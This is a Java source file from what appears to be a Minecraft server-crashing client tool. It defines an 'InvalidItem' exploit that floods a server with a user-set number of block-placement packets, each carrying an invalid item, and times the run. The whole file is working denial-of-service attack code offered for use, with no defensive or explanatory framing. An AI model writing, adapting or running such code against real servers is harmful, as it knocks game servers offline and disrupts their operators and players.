package dev.isnow.puppy.exploit.impl.nbt;

import dev.isnow.puppy.exception.ExploitException;
import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.helper.ChatHelper;
import dev.isnow.puppy.helper.NetHelper;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;

@ExploitInfo(
        name = "InvalidItem",
        type = ExploitType.NBT,
        description = "Simple Item crasher"
)
public class InvalidItem extends Exploit {

    @Override
    public void execute(Object... args) throws ExploitException {
        long start = System.currentTimeMillis();
        ChatHelper.printMessage(
                String.format("Sending &8[&7Method: &7%s&7, Packets: &7%s&8]", getName(), args[0]));
        for (int i = 0; i < Integer.parseInt((String) args[0]); i++) {
            NetHelper.sendPacket(new C08PacketPlayerBlockPlacement(new ItemStack(new Item())));
        }

        ChatHelper.printMessage(String.format("Sent &8[&7Method: &7%s&7, Time: &7%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}
